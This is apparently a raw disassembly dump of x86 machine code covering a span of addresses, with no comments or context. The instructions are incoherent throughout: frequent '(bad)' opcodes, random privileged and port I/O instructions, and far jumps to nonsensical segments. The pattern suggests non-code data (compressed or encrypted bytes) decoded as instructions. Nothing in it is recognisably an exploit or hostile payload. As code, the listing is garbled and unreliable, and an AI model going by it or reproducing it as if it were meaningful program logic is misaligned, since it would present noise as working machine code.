  421eab:	mov    ah,0x13
  421ead:	adc    dh,ch
  421eaf:	int3   
  421eb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421eb1:	aaa    
  421eb2:	cli    
  421eb3:	frstor [edi+eax*4+0x62cdcd3e]
  421eba:	enter  0x17e5,0xde
  421ebe:	mov    WORD PTR [ebx-0x6927cb72],fs
  421ec4:	jb     0x421e69
  421ec6:	les    ecx,FWORD PTR [eax-0x6d92b96c]
  421ecc:	sub    BYTE PTR [edx+ebp*8+0xd],bh
  421ed0:	mov    eax,0x6c177aec
  421ed5:	mov    cl,bh
  421ed7:	push   ds
  421ed8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421ed9:	adc    dh,bl
  421edb:	jecxz  0x421ebe
  421edd:	sbb    DWORD PTR [ebx-0x33],esp
  421ee0:	int3   
  421ee1:	mov    eax,ds:0xbfe5233f
  421ee6:	cmc    
  421ee7:	or     cl,ah
  421ee9:	fwait
  421eea:	stos   DWORD PTR es:[edi],eax
  421eeb:	jmp    0x421f1e
  421eed:	sahf   
  421eee:	ror    DWORD PTR [ebx-0xe],cl
  421ef1:	das    
  421ef2:	nop
  421ef3:	dec    esi
  421ef4:	jno    0x421f0c
  421ef6:	pop    es
  421ef7:	sub    al,0x7b
  421ef9:	xor    dh,BYTE PTR [edi]
  421efb:	ins    BYTE PTR es:[edi],dx
  421efc:	or     eax,0xaf83393e
  421f01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f02:	aam    0xa8
  421f04:	hlt    
  421f05:	outs   dx,BYTE PTR ds:[esi]
  421f06:	std    
  421f07:	sub    al,0x83
  421f09:	or     bl,dl
  421f0b:	dec    edx
  421f0c:	retf   0x189d
  421f0f:	adc    eax,0xb8b68a12
  421f14:	ror    DWORD PTR [edx],0x93
  421f17:	dec    edx
  421f18:	mov    dl,0xb9
  421f1a:	fdiv   QWORD PTR [ecx-0x34]
  421f1d:	ds pop esi
  421f1f:	in     al,dx
  421f20:	cmp    esp,DWORD PTR [edi]
  421f22:	aam    0xf6
  421f24:	jmp    0x50cb:0xa6fec6c5
  421f2b:	in     eax,0x65
  421f2d:	popf   
  421f2e:	or     esp,ebp
  421f30:	and    BYTE PTR [esi],bh
  421f32:	hlt    
  421f33:	push   cs
  421f34:	pop    ebp
  421f35:	adc    DWORD PTR [eax],esp
  421f37:	push   edi
  421f38:	xor    BYTE PTR [eax+0x5d9abcc5],bl
  421f3e:	in     al,dx
  421f3f:	std    
  421f40:	out    dx,al
  421f41:	cld    
  421f42:	jge    0x421f59
  421f44:	aam    0xb
  421f46:	inc    edi
  421f47:	push   ebp
  421f48:	mov    dl,BYTE PTR [eax+0x42]
  421f4b:	pop    ecx
  421f4c:	cmp    al,BYTE PTR cs:[esi-0x10194c36]
  421f53:	popa   
  421f54:	shl    BYTE PTR [ecx-0x5c],1
  421f57:	mov    al,0x7d
  421f59:	leave  
  421f5a:	xor    dh,BYTE PTR [edx]
  421f5c:	(bad)  
  421f5d:	and    ecx,DWORD PTR [edi]
  421f5f:	adc    al,0x78
  421f61:	push   cs
  421f62:	rcl    DWORD PTR [eax],1
  421f64:	(bad)  
  421f65:	dec    ebp
  421f66:	or     eax,0x17ef61d7
  421f6b:	aam    0xb6
  421f6d:	(bad)  
  421f6e:	dec    esi
  421f6f:	aad    0x0
	...
  421f79:	add    dh,ch
  421f7b:	ret    0x2d9d
  421f7e:	mov    ebp,0x33c3fe7f
  421f83:	ja     0x421f4e
  421f85:	or     BYTE PTR [edi],ah
  421f87:	mov    ds:0x9af0424c,al
  421f8c:	add    DWORD PTR [eax],eax
  421f8e:	inc    BYTE PTR [ecx]
  421f90:	add    BYTE PTR [eax],al
  421f92:	fwait
  421f93:	sbb    al,0x2f
  421f95:	pop    ebp
  421f96:	xor    bh,BYTE PTR [ebp-0x2d535959]
  421f9c:	dec    ebx
  421f9d:	sub    dh,al
  421f9f:	repz and BYTE PTR [edi],bh
  421fa2:	fsubr  QWORD PTR [ecx]
  421fa4:	inc    esp
  421fa5:	push   0xffffffb7
  421fa7:	push   edx
  421fa8:	sub    eax,0xe7e36681
  421fad:	js     0x422021
  421faf:	hlt    
  421fb0:	sub    bh,dh
  421fb2:	inc    ebx
  421fb3:	mov    dl,0xd5
  421fb5:	mov    ebp,0xfaf1d521
  421fba:	push   cs
  421fbb:	idiv   BYTE PTR [edi+ebx*8-0x8]
  421fbf:	add    DWORD PTR [esi+0x4754e7db],ebx
  421fc5:	and    ebx,DWORD PTR [ecx]
  421fc7:	cmp    ch,BYTE PTR [ecx+0x4fba952]
  421fcd:	pop    edx
  421fce:	sub    al,0xb0
  421fd0:	inc    edx
  421fd1:	(bad)  
  421fd3:	mov    eax,ds:0x8ae87ed6
  421fd8:	dec    ecx
  421fd9:	xchg   ebp,eax
  421fda:	cmp    BYTE PTR [edx],bl
  421fdc:	sbb    edi,DWORD PTR ds:0xfa27e413
  421fe2:	adc    ch,BYTE PTR [ebx+0x3f]
  421fe5:	repnz inc ebx
  421fe7:	xchg   ch,cl
  421fe9:	jb     0x421f8a
  421feb:	jb     0x42206a
  421fed:	rol    dl,1
  421fef:	(bad)  
  421ff1:	jl     0x421fa7
  421ff3:	popf   
  421ff4:	mov    ds:0xd357fdb6,al
  421ff9:	(bad)  
  421ffa:	int3   
  421ffb:	mov    bh,0xff
  421ffd:	add    eax,0x7343ead0
  422002:	gs pop ss
  422004:	pop    esi
  422005:	xchg   ecx,eax
  422006:	(bad)  
  422007:	adc    BYTE PTR [edi+eax*8+0x6f67183],ch
  42200e:	mov    edx,0x251490a4
  422013:	lods   al,BYTE PTR ds:[esi]
  422014:	sbb    DWORD PTR [ebx],esi
  422016:	jp     0x421fee
  422018:	sti    
  422019:	sbb    ebx,DWORD PTR [ecx+esi*8]
  42201c:	push   edi
  42201d:	jmp    0x49f:0xb7645150
  422024:	bnd jmp 0x1e5c350
  42202a:	jb     0x4220a8
  42202c:	push   0xcf9e75b8
  422031:	int    0xc5
  422033:	setae  BYTE PTR [edx]
  422036:	aad    0xc0
  422038:	jne    0x422044
  42203a:	sub    DWORD PTR [eax-0x72],ecx
  42203d:	xlat   BYTE PTR ds:[ebx]
  42203e:	cmp    eax,0x8c2b45bc
  422043:	in     al,0x5
  422045:	mov    edi,0x54a32406
  42204a:	icebp  
  42204b:	jg     0x42202d
  42204d:	(bad)  
  42204e:	fcmove st,st(7)
  422050:	(bad)  
  422051:	bound  esp,QWORD PTR [ebp+0x19507ec9]
  422057:	jb     0x422078
  422059:	jo     0x422051
  42205b:	test   DWORD PTR [edi+0x184cf7e5],edx
  422061:	pop    edx
  422062:	adc    dh,BYTE PTR [esi]
  422064:	not    DWORD PTR [esi+edi*4]
  422067:	arpl   WORD PTR [eax+eax*1],cx
  42206a:	cmp    cl,BYTE PTR [ecx+0x44]
  42206d:	pop    ebp
  42206e:	push   0x6d
  422070:	mov    ds:0x1db1840b,al
  422075:	retf   0xe045
  422078:	mov    esp,0x1309aa05
  42207d:	imul   edx,eax,0x0
  422080:	fs push esp
  422082:	shr    BYTE PTR [edi+0x6d],0xb4
  422086:	dec    ebp
  422087:	das    
  422088:	cmovle eax,edi
  42208b:	jle    0x422065
  42208d:	sub    eax,0x9855db61
  422092:	sbb    al,0x13
  422094:	stos   DWORD PTR es:[edi],eax
  422095:	sub    ch,dh
  422097:	ror    bl,1
  422099:	xchg   ebx,eax
  42209a:	icebp  
  42209b:	dec    esi
  42209c:	push   edi
  42209d:	xor    edx,DWORD PTR [ecx+0x1f8c6f2e]
  4220a3:	push   eax
  4220a4:	sbb    BYTE PTR [eax],bl
  4220a6:	add    DWORD PTR [ebx+0x4f498cfc],edx
  4220ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4220ad:	xchg   BYTE PTR [eax-0x34c9f4cb],ch
  4220b3:	mov    DWORD PTR [ecx+0x2ed28d62],esp
  4220b9:	sbb    BYTE PTR [ebx+edi*8],dh
  4220bc:	jbe    0x4220fa
  4220be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4220bf:	xchg   esi,eax
  4220c0:	dec    eax
  4220c1:	cmp    eax,0xd09476ce
  4220c6:	in     al,dx
  4220c7:	int    0x2
  4220c9:	mov    edi,0x4bdc1007
  4220ce:	rcr    BYTE PTR [eax+0x8b8ef8e],1
  4220d4:	sub    al,0xa9
  4220d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4220d7:	add    eax,0xebbab700
  4220dc:	(bad)  
  4220de:	(bad)  
  4220df:	stc    
  4220e0:	add    DWORD PTR [eax-0x6d55f806],edx
  4220e6:	and    al,0xb5
  4220e8:	adc    al,0x2c
  4220ea:	repnz or eax,0x2f71a43a
  4220f0:	adc    eax,esp
  4220f2:	in     al,0x29
  4220f4:	push   ebx
  4220f5:	(bad)  
  4220f6:	ret    
  4220f7:	mov    bl,0xa7
  4220f9:	mov    dh,0xa9
  4220fb:	push   esp
  4220fc:	xchg   esp,eax
  4220fd:	dec    edi
  4220fe:	retf   
  4220ff:	outs   dx,BYTE PTR ds:[esi]
  422100:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422101:	les    edi,FWORD PTR [ecx+0x7d82a651]
  422107:	adc    dh,BYTE PTR [esi-0x70fd2a3e]
  42210d:	push   esi
  42210e:	xchg   esp,eax
  42210f:	sbb    ecx,eax
  422111:	xor    edx,eax
  422113:	lods   eax,DWORD PTR ds:[esi]
  422114:	jp     0x4220ce
  422116:	and    ah,0x21
  422119:	repz cld 
  42211b:	aas    
  42211c:	es xadd al,ah
  422120:	and    al,BYTE PTR [ebx]
  422122:	xchg   DWORD PTR [eax-0x34],ebp
  422125:	jmp    0x33c27ba8
  42212a:	pop    edx
  42212b:	cmp    eax,0xbdf56e36
  422130:	aam    0x3a
  422132:	lock adc bh,BYTE PTR [esi+0x17dc1e3e]
  422139:	aam    0x28
  42213b:	add    DWORD PTR [ebx],ebx
  42213d:	fdiv   QWORD PTR [bp+si+0x66]
  422141:	out    dx,eax
  422142:	xchg   edi,eax
  422143:	sbb    eax,0xe7a086bf
  422148:	cmp    DWORD PTR [ebp+eiz*4+0x6c],ecx
  42214c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42214d:	push   eax
  42214e:	or     BYTE PTR ds:0xb777e846,bl
  422154:	pusha  
  422155:	and    eax,0x9ae391ad
  42215a:	pop    ebp
  42215b:	cmp    ebx,DWORD PTR [esi]
  42215d:	jmp    0x42216e
  42215f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422160:	sbb    edi,DWORD PTR [edi-0x74]
  422163:	inc    ebp
  422164:	jnp    0x42215e
  422166:	sti    
  422167:	sti    
  422168:	and    bh,ah
  42216a:	dec    esi
  42216b:	hlt    
  42216c:	dec    edi
  42216d:	and    DWORD PTR [eax+ebp*2+0xe728e37],ebx
  422174:	cli    
  422175:	imul   edx
  422177:	(bad)  
  422179:	mov    ebp,0xe1458cce
  42217e:	sti    
  42217f:	cvtps2pi mm6,QWORD PTR [ecx+0x6c846ef0]
  422186:	or     al,BYTE PTR [edi-0x1d21da8d]
  42218c:	xchg   ecx,eax
  42218d:	cmc    
  42218e:	or     cl,BYTE PTR [ebx]
	...
  422198:	add    BYTE PTR [eax],al
  42219a:	push   ebx
  42219b:	(bad)  
  42219c:	(bad)  
  42219d:	push   esi
  42219e:	(bad)  
  42219f:	jle    0x42219c
  4221a1:	xlat   BYTE PTR ds:[ebx]
  4221a2:	retf   
  4221a3:	push   ds
  4221a4:	test   DWORD PTR [ebp+0x32],0xeee7af89
  4221ab:	pushf  
  4221ac:	add    DWORD PTR [eax],eax
  4221ae:	inc    BYTE PTR [ecx]
  4221b0:	add    BYTE PTR [eax],al
  4221b2:	jno    0x422192
  4221b4:	push   ebx
  4221b5:	ret    
  4221b6:	jle    0x422154
  4221b8:	cwde   
  4221b9:	arpl   WORD PTR [esi],cx
  4221bb:	pop    ss
  4221bc:	cs xchg edx,eax
  4221be:	sbb    DWORD PTR [edx],ebx
  4221c0:	mov    al,ds:0x6b6d1195
  4221c5:	sbb    BYTE PTR [ebx-0x41],bl
  4221c8:	jg     0x422152
  4221ca:	lock gs std 
  4221cd:	pusha  
  4221ce:	mov    ebp,0xe8004885
  4221d3:	inc    ecx
  4221d4:	rcl    DWORD PTR ds:0x26feba65,0x8c
  4221db:	aaa    
  4221dc:	cmp    DWORD PTR [ebx],0xabf9c1f2
  4221e2:	loop   0x42224e
  4221e4:	cmp    bh,BYTE PTR [ecx+0x4c4e834]
  4221ea:	and    eax,0xa9ecdda3
  4221ef:	or     al,0x29
  4221f1:	add    dh,dl
  4221f3:	scas   eax,DWORD PTR es:[edi]
  4221f4:	mov    ds:0x7b7bc6b,eax
  4221f9:	shl    BYTE PTR [edx-0x4da768e2],1
  4221ff:	add    ebp,ebx
  422201:	sub    edx,DWORD PTR [edi]
  422203:	cdq    
  422204:	and    eax,0xd30442a
  422209:	std    
  42220a:	mov    ecx,0xe45120ed
  42220f:	dec    edx
  422210:	fdivr  DWORD PTR [eax+0x73]
  422213:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422214:	ficomp WORD PTR [ebx-0x15]
  422217:	ja     0x4221c3
  422219:	shr    ebp,cl
  42221b:	nop
  42221c:	sub    esi,DWORD PTR [ecx+0xee3429e]
  422222:	je     0x42220b
  422224:	jno    0x4221df
  422226:	xor    eax,DWORD PTR [ecx-0x13]
  422229:	jg     0x422255
  42222b:	push   eax
  42222c:	and    BYTE PTR [eax+eax*2],bh
  42222f:	xor    bl,0xaa
  422232:	push   0x7cfe02a9
  422237:	test   bh,bh
  422239:	pop    ebx
  42223a:	inc    eax
  42223b:	push   esi
  42223c:	or     al,0x9c
  42223f:	je     0x4222a2
  422241:	mov    ebx,0x516e3b74
  422246:	jmp    0x422256
  422248:	aas    
  422249:	imul   ebp,edx,0x3d70159b
  42224f:	sbb    edi,DWORD PTR [eax+0x6a]
  422252:	retf   0x5470
  422255:	jmp    0x4221fd
  422257:	push   ss
  422258:	cmp    dl,BYTE PTR [eax+0x7f]
  42225b:	sub    al,0x1
  42225d:	mov    BYTE PTR [esi],bl
  42225f:	jae    0x42229b
  422261:	cmp    al,0x41
  422263:	xchg   BYTE PTR [ecx],al
  422265:	pop    esi
  422266:	cld    
  422267:	jbe    0x422217
  422269:	dec    ebp
  42226a:	outs   dx,BYTE PTR ds:[esi]
  42226b:	imul   esi,DWORD PTR [eax-0x19],0xffffffb1
  42226f:	out    dx,al
  422270:	jb     0x422223
  422272:	mov    al,0xe9
  422274:	add    al,BYTE PTR [ecx-0x62]
  422277:	call   0x43d:0xcc97c35a
  42227e:	and    al,0x12
  422280:	daa    
  422281:	std    
  422282:	ins    BYTE PTR es:[edi],dx
  422283:	mov    ch,0xd4
  422285:	or     eax,0x74f23cde
  42228a:	shl    esp,1
  42228c:	cs (bad) 
  42228e:	xchg   ebx,eax
  42228f:	adc    eax,ebp
  422291:	ss (bad) 
  422293:	and    DWORD PTR [ebx],ecx
  422295:	pop    edx
  422296:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422297:	pop    es
  422298:	dec    eax
  422299:	xor    DWORD PTR [ecx-0x7a2c77fc],0x45
  4222a0:	xor    al,0xaa
  4222a2:	inc    ebp
  4222a3:	adc    eax,0xa04c4a41
  4222a8:	cmp    al,BYTE PTR [ebx-0x74c0774c]
  4222ae:	inc    esi
  4222af:	cmp    edi,DWORD PTR [edi]
  4222b1:	retf   0x5ec6
  4222b4:	mov    DWORD PTR [esp+eax*1-0x476e82a9],0xdb34a0af
  4222bf:	pop    es
  4222c0:	pop    esp
  4222c1:	jmp    0x42c3:0xd2d8babe
  4222c8:	and    eax,0x26276e46
  4222cd:	shl    BYTE PTR [edi+0x6d],cl
  4222d0:	jbe    0x42230a
  4222d2:	scas   al,BYTE PTR es:[edi]
  4222d3:	jle    0x42225c
  4222d5:	xchg   DWORD PTR [ecx+0x381ce7d],ecx
  4222db:	pop    eax
  4222dc:	rcl    dl,cl
  4222de:	pop    ebx
  4222df:	stc    
  4222e0:	ja     0x42235b
  4222e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4222e3:	cmp    cl,BYTE PTR ds:[ebx-0x55]
  4222e7:	jl     0x422333
  4222e9:	jne    0x42232c
  4222eb:	cdq    
  4222ec:	sbb    esi,DWORD PTR [ecx+0x69777d3a]
  4222f2:	inc    esi
  4222f3:	stos   BYTE PTR es:[edi],al
  4222f4:	xchg   edx,eax
  4222f5:	pop    ds
  4222f6:	add    al,0x46
  4222f8:	inc    edi
  4222f9:	push   ecx
  4222fa:	(bad)  
  4222fb:	outs   dx,BYTE PTR ds:[esi]
  4222fc:	stos   BYTE PTR es:[edi],al
  4222fd:	cmp    cl,BYTE PTR [ecx+0x19ad286b]
  422303:	and    ecx,esp
  422305:	retf   0xf879
  422308:	sub    al,0xf1
  42230a:	setnp  cl
  42230d:	push   eax
  42230e:	mov    esi,0xc03a2a24
  422313:	fs out dx,al
  422315:	push   0x876b578a
  42231a:	add    edx,ebx
  42231c:	cmp    DWORD PTR [edx-0x3d],edx
  42231f:	pop    ds
  422320:	(bad)  
  422321:	pop    ebx
  422322:	mov    ebp,0x6961978e
  422327:	push   es
  422328:	add    ebp,esi
  42232a:	mov    ah,0x9
  42232c:	push   ebp
  42232d:	mov    bh,0xc0
  42232f:	or     DWORD PTR [ebx+0x4593e3fd],ebp
  422335:	and    BYTE PTR [edx+0xd],bl
  422338:	rol    DWORD PTR [esi],cl
  42233a:	push   edi
  42233b:	outs   dx,DWORD PTR ds:[esi]
  42233c:	mov    bl,0xb
  42233e:	ret    
  42233f:	xchg   ebx,eax
  422340:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422341:	gs dec ecx
  422343:	ss push esp
  422345:	lock aas 
  422347:	cmp    ebp,DWORD PTR [edx]
  422349:	mov    ah,0x41
  42234b:	lea    ebp,[ebp-0x23]
  42234e:	out    0xd8,al
  422350:	imul   ebp,DWORD PTR [edi+0x7c5fde44],0x4adfc0a4
  42235a:	rcr    cl,cl
  42235c:	push   ecx
  42235d:	sahf   
  42235e:	lea    ecx,[eax]
  422360:	xchg   ecx,eax
  422361:	dec    ecx
  422362:	lds    ebx,FWORD PTR [ebx-0x170117a7]
  422368:	adc    al,0x0
  42236a:	mov    edx,0xc39e12ce
  42236f:	cmp    ebp,edi
  422371:	ds out dx,al
  422373:	(bad)  
  422374:	mov    ds,eax
  422376:	rcl    edi,cl
  422378:	jl     0x42231c
  42237a:	ror    ecx,0xf4
  42237d:	dec    eax
  42237e:	pop    es
  42237f:	cdq    
  422380:	dec    ebx
  422381:	stos   DWORD PTR es:[edi],eax
  422382:	push   ebx
  422383:	call   FWORD PTR [ecx+0x489459c4]
  422389:	fnstsw WORD PTR [edx]
  42238b:	dec    edi
  42238c:	outs   dx,DWORD PTR ds:[esi]
  42238d:	nop
  42238e:	xchg   edx,eax
  42238f:	pop    ss
  422390:	icebp  
  422391:	(bad)  
  422392:	xchg   ebx,eax
  422393:	xchg   edi,eax
  422394:	aaa    
  422395:	jno    0x4223b0
  422397:	idiv   DWORD PTR [ebx-0x15]
  42239a:	fs dec esi
  42239c:	pushf  
  42239d:	dec    edi
  42239e:	and    esi,DWORD PTR [eax]
  4223a0:	mov    al,0xd0
  4223a2:	int3   
  4223a3:	fsubr  QWORD PTR [ecx-0x497464ae]
  4223a9:	xchg   edi,eax
  4223aa:	sahf   
  4223ab:	jns    0x4223b4
  4223ad:	and    DWORD PTR [esi],ebp
  4223af:	pop    ds
	...
  4223b8:	add    BYTE PTR [eax],al
  4223ba:	adc    DWORD PTR [esi],ecx
  4223bc:	or     dl,ch
  4223be:	pop    ds
  4223bf:	out    dx,al
  4223c0:	repz jmp FWORD PTR [ecx-0x6c]
  4223c4:	fucomp st(0)
  4223c6:	(bad)  
  4223c8:	shufps xmm5,xmm4,0x9e
  4223cc:	add    DWORD PTR [eax],eax
  4223ce:	inc    BYTE PTR [ecx]
  4223d0:	add    BYTE PTR [eax],al
  4223d2:	mov    fs,WORD PTR [eax+0x1edeb9c7]
  4223d8:	in     al,0xd6
  4223da:	in     al,dx
  4223db:	inc    eax
  4223dc:	pop    edi
  4223dd:	jmp    0x4223a5
  4223df:	push   ecx
  4223e0:	aas    
  4223e1:	enter  0xa597,0x1f
  4223e5:	js     0x4223fc
  4223e7:	mov    dl,BYTE PTR [edx-0x8]
  4223ea:	mov    edx,0xab29509b
  4223ef:	shl    BYTE PTR [edi+0x2e5ae5a4],cl
  4223f5:	fdiv   st,st(4)
  4223f7:	cli    
  4223f8:	pop    ebp
  4223f9:	push   eax
  4223fa:	ret    
  4223fb:	jns    0x4223c2
  4223fd:	popf   
  4223fe:	push   ss
  4223ff:	push   ebp
  422400:	pop    eax
  422401:	test   DWORD PTR [eax],ebp
  422403:	sbb    ecx,esp
  422405:	and    al,0x6f
  422407:	test   al,0x75
  422409:	inc    ecx
  42240a:	xor    DWORD PTR [esi-0xd629414],esp
  422410:	std    
  422411:	xor    esp,ecx
  422413:	hlt    
  422414:	outs   dx,BYTE PTR ds:[esi]
  422415:	and    BYTE PTR ds:0x23789228,bh
  42241b:	jnp    0x4223d4
  42241d:	mov    ebp,0x27123022
  422422:	std    
  422423:	(bad)  
  422424:	fstp   QWORD PTR [ecx+edx*4]
  422427:	test   al,0x8e
  422429:	cmp    eax,0x125b760f
  42242e:	sub    esi,edi
  422430:	fidivr WORD PTR [eax]
  422432:	fimul  DWORD PTR [ecx+0x44cbd64a]
  422438:	push   ecx
  422439:	scas   eax,DWORD PTR es:[edi]
  42243a:	jl     0x422489
  42243c:	pop    es
  42243d:	cmp    ah,BYTE PTR [edx-0x483540c0]
  422443:	adc    eax,0x246a7898
  422448:	mov    eax,ds:0x6a22b051
  42244d:	cs cmc 
  42244f:	mov    DWORD PTR [edx+0xfe448ec],eax
  422455:	mov    bl,0x1f
  422457:	or     DWORD PTR [ebx],0xeba85f57
  42245d:	xchg   ebp,eax
  42245e:	jg     0x42241d
  422460:	mov    cl,al
  422462:	xchg   dh,bh
  422464:	cmp    BYTE PTR [edi],0xe9
  422467:	mov    esp,0x3d57efe9
  42246c:	lods   eax,DWORD PTR ds:[esi]
  42246d:	outs   dx,DWORD PTR ds:[esi]
  42246e:	jnp    0x4223fa
  422470:	xchg   esi,eax
  422471:	pop    esp
  422472:	jmp    0x18abbb59
  422477:	adc    esi,DWORD PTR [esi+0x15]
  42247a:	push   ebp
  42247b:	fimul  WORD PTR ds:0xe5f5a36
  422481:	shl    edx,0x65
  422484:	push   esi
  422485:	mov    eax,0xaa57e9a5
  42248a:	jno    0x42244a
  42248c:	mov    ch,0xc4
  42248e:	mov    esp,0x4b249c4f
  422493:	xchg   ecx,eax
  422494:	dec    esp
  422495:	sahf   
  422496:	pop    ebx
  422497:	lds    ebx,FWORD PTR [edi+0x2658972c]
  42249d:	ds mov ch,0xb0
  4224a0:	call   0x556c:0xcab5765e
  4224a7:	xor    eax,0xdf2fcacb
  4224ac:	ror    BYTE PTR [ecx-0x4c],1
  4224af:	in     al,dx
  4224b0:	xchg   edi,eax
  4224b1:	es jns 0x422516
  4224b4:	mov    al,0x3f
  4224b6:	mov    BYTE PTR [edx+0x5],bh
  4224b9:	pop    eax
  4224ba:	jno    0x4224ee
  4224bc:	mov    esp,0x9e5a61f4
  4224c1:	xor    eax,0xfa923e73
  4224c6:	sub    bh,bh
  4224c8:	sar    DWORD PTR [edi+0xc],cl
  4224cb:	fldcw  WORD PTR [eax+0x35]
  4224ce:	add    al,0x29
  4224d0:	nop
  4224d1:	sub    ah,ah
  4224d3:	add    cl,BYTE PTR [edi+0x73]
  4224d6:	test   bl,ah
  4224d8:	cmp    DWORD PTR [edi],0x9cc46307
  4224de:	mov    cl,0x6b
  4224e0:	mov    WORD PTR [ecx-0x47601e56],ss
  4224e6:	(bad)  
  4224e7:	jo     0x4224a2
  4224e9:	sbb    DWORD PTR [esi-0x5a],edi
  4224ec:	add    DWORD PTR [ebx-0x2cbdd5a8],eax
  4224f2:	ret    0xe336
  4224f5:	fs mov bh,0x26
  4224f8:	scas   eax,DWORD PTR es:[edi]
  4224f9:	(bad)  
  4224fb:	fcomp  DWORD PTR [ebx-0x25]
  4224fe:	and    BYTE PTR [ecx+0x7f],0x2c
  422502:	mov    ebx,0x9bc50135
  422507:	dec    esp
  422508:	cdq    
  422509:	and    BYTE PTR [ebp-0x4744462d],cl
  42250f:	pop    edx
  422510:	mov    WORD PTR [ebx-0x21939439],es
  422516:	sti    
  422517:	or     ah,ah
  422519:	mov    cl,0x26
  42251b:	mov    ds:0xe53b7363,eax
  422520:	mov    ds:0x3117518d,al
  422525:	(bad)  
  422526:	dec    ebx
  422527:	adc    al,0x58
  422529:	jp     0x4224f1
  42252b:	aad    0x90
  42252d:	dec    esp
  42252e:	push   0xffffffe7
  422530:	stos   BYTE PTR es:[edi],al
  422531:	mov    eax,ds:0x3c0ee47f
  422536:	xchg   edi,eax
  422537:	or     cl,BYTE PTR [eax-0x12f3c0e7]
  42253d:	xchg   edx,eax
  42253e:	or     eax,0xe043a311
  422543:	pop    ss
  422544:	rcr    DWORD PTR [eax-0x22ae500e],0x99
  42254b:	jl     0x42258b
  42254d:	retf   0xf9f
  422550:	push   ebx
  422551:	mov    esp,0xe7562d55
  422556:	xor    esp,eax
  422558:	mov    bl,0x98
  42255a:	call   0xa44:0xd1c91f37
  422561:	dec    edi
  422562:	clc    
  422563:	xchg   ecx,eax
  422564:	or     edi,DWORD PTR [ebx+0x63aa0ac6]
  42256a:	pop    ebp
  42256b:	push   ebp
  42256c:	lds    esp,FWORD PTR gs:[ecx]
  42256f:	ins    BYTE PTR es:[edi],dx
  422570:	sub    WORD PTR [ecx+0x30db693],bx
  422577:	jge    0x4225e4
  422579:	and    DWORD PTR [edi+0x5ea83e70],0x49b99796
  422583:	push   esp
  422584:	and    DWORD PTR [ebp-0x70],eax
  422587:	out    dx,al
  422588:	call   0x4023:0xc200369a
  42258f:	es push ebp
  422591:	les    esp,FWORD PTR [bx+0x1459]
  422596:	cli    
  422597:	pop    ds
  422598:	inc    edi
  422599:	je     0x42252b
  42259b:	mov    al,0xff
  42259d:	clc    
  42259e:	inc    edx
  42259f:	and    esp,DWORD PTR [edx*1+0x4b75a0d6]
  4225a6:	mov    edx,0xcc814d3d
  4225ab:	aam    0xa8
  4225ad:	fnstsw WORD PTR [eax+0x1c8e67c7]
  4225b3:	and    esp,DWORD PTR [eax-0x5f2ed01]
  4225b9:	or     DWORD PTR [eax+0x1],ecx
  4225bc:	add    ebp,DWORD PTR [ecx+0x70]
  4225bf:	mul    BYTE PTR [eax+0x5780207]
  4225c5:	dec    edi
  4225c6:	je     0x4225b6
  4225c8:	inc    esi
  4225c9:	sbb    DWORD PTR [edi+0x57],0x946654d8
	...
  4225d8:	add    BYTE PTR [eax],al
  4225da:	leave  
  4225db:	xchg   esi,eax
  4225dc:	ins    DWORD PTR es:[edi],dx
  4225dd:	mov    dh,0x7f
  4225df:	(bad)  
  4225e0:	(bad)  
  4225e2:	out    0x3f,al
  4225e4:	nop
  4225e5:	sbb    esi,DWORD PTR [edx-0x153df5f0]
  4225eb:	mov    al,ds:0x1fe0001
  4225f0:	add    BYTE PTR [eax],al
  4225f2:	jno    0x4225d4
  4225f4:	mov    ebp,0x93f8b0d2
  4225f9:	inc    esi
  4225fa:	jo     0x4225ee
  4225fc:	lahf   
  4225fd:	pop    es
  4225fe:	out    dx,al
  4225ff:	dec    edi
  422600:	xor    BYTE PTR [ecx],cl
  422602:	push   eax
  422603:	jae    0x4225cc
  422605:	adc    eax,0xbb4e7622
  42260a:	sahf   
  42260b:	jbe    0x422659
  42260d:	jae    0x4225d3
  42260f:	stos   DWORD PTR es:[edi],eax
  422610:	hlt    
  422611:	in     eax,0x15
  422613:	pushf  
  422614:	jle    0x4225c6
  422616:	sbb    eax,0xc9d500c2
  42261b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42261c:	xor    DWORD PTR [ebp+0x12],esi
  42261f:	icebp  
  422620:	mov    ah,0x9d
  422622:	in     al,dx
  422623:	fistp  DWORD PTR [esp+ebx*2+0x3b]
  422627:	sub    DWORD PTR [eax+0x46],0x449786a4
  42262e:	aam    0xc5
  422630:	retf   
  422631:	daa    
  422632:	pop    edx
  422633:	mov    esi,0x89950c64
  422638:	out    dx,eax
  422639:	ins    BYTE PTR es:[edi],dx
  42263a:	add    al,0x23
  42263c:	jo     0x4226a4
  42263e:	int3   
  42263f:	out    0x9d,al
  422641:	call   0x6325f81e
  422646:	mov    edi,0x4a0e2680
  42264b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42264c:	push   ebp
  42264d:	clc    
  42264e:	lea    edx,[edi]
  422650:	cmp    eax,0xec662ba3
  422655:	jo     0x4225e3
  422657:	push   ds
  422658:	in     al,dx
  422659:	jl     0x422680
  42265b:	cmp    eax,0x1937f080
  422660:	neg    BYTE PTR [ecx+0x34]
  422663:	push   0x72
  422665:	cmp    ch,BYTE PTR [eax-0xa869b5c]
  42266b:	xor    al,0xf4
  42266d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42266e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42266f:	sti    
  422670:	ins    DWORD PTR es:[edi],dx
  422671:	jge    0x422620
  422673:	adc    BYTE PTR [edx-0x56fdce04],dh
  422679:	loope  0x4226b7
  42267b:	sahf   
  42267c:	scas   al,BYTE PTR es:[edi]
  42267d:	sahf   
  42267e:	dec    BYTE PTR [ebx+0x2967d6a5]
  422684:	jb     0x422692
